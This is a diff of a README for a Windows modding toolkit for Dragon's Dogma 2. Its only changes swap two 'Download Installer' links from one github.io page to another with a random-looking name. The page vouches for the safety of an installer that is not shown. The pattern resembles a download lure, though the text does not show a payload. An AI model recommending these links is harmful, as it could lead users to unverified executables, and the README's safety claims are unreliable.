@@ -2,7 +2,7 @@
 
 The Dragon's Dogma 2 Ultimate Suite is a comprehensive modding toolkit designed for Windows desktop users, offering a wide range of features to customize and enhance your experience in Dragon's Dogma 2. Built for the 2026 gaming landscape, this tool allows you to modify gameplay elements like health, stamina, and skills, providing a tailored adventure without compromising safety or performance.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -52,7 +52,7 @@ A: Absolutely. The toolkit includes advanced settings where you can adjust param
 
 Access the latest version of the Dragon's Dogma 2 Ultimate Suite through the official download link. Only use trusted sources to maintain security and reliability.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 *Last Updated: December 2026*
 
